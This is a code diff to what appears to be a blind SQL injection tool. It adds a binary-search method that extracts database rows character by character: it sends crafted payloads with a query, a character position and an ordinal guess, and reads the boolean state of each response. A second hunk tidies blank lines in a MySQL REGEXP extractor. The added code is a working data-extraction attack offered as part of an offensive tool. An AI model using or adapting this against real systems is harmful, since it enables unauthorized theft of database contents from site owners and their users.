@@ -418,6 +418,52 @@ class Method_bitwise(Method_Blind):
           requester = self.make_requester()
           continue
 
+class Method_binary(Method_bitwise):
+  '''Binary Search'''
+
+  def get_row(self, query, row_pos=0):
+    logger.debug('query: %s' % query)
+
+    result = ''
+    char_pos = 1
+    charset = [chr(i) for i in range(127)]
+
+    while True:
+
+      lo = 0
+      hi = len(charset) - 1
+
+      while lo <= hi:
+        mid = (lo + hi) / 2
+
+        payload = make_payload(self.template, ('query', query), ('char_pos', char_pos), ('char_ord', ord(charset[mid])), ('row_pos', row_pos))
+        self.taskq.put_nowait((0, payload))
+
+        _, state = self.get_state()
+        if state:
+          lo = mid + 1
+
+        else:
+          hi = mid - 1
+
+      char = charset[lo]
+      logger.debug('char: %d (%r)' % (ord(char), char))
+
+      if char == charset[0]:
+        break
+
+      sys.stdout.write('%s' % char)
+      sys.stdout.flush()
+
+      result += char
+      char_pos += 1
+
+    sys.stdout.write('\r')
+    sys.stdout.flush()
+
+    logger.debug('row %d: %s' % (row_pos, result))
+    return result
+
 class Method_regexp(Method_bitwise):
   '''MySQL REGEXP'''
 
@@ -445,11 +491,9 @@ class Method_regexp(Method_bitwise):
           regexp = "'^%s[%s]'" % ('.' * len(result), left.replace("'", "''").replace('\\', '\\\\\\\\'))
 
         payload = make_payload(self.template, ('query', query), ('regexp', regexp), ('row_pos', row_pos))
-
         self.taskq.put_nowait((0, payload))
 
         _, state = self.get_state()
-
         if state:
           s = left
           prev_left = left
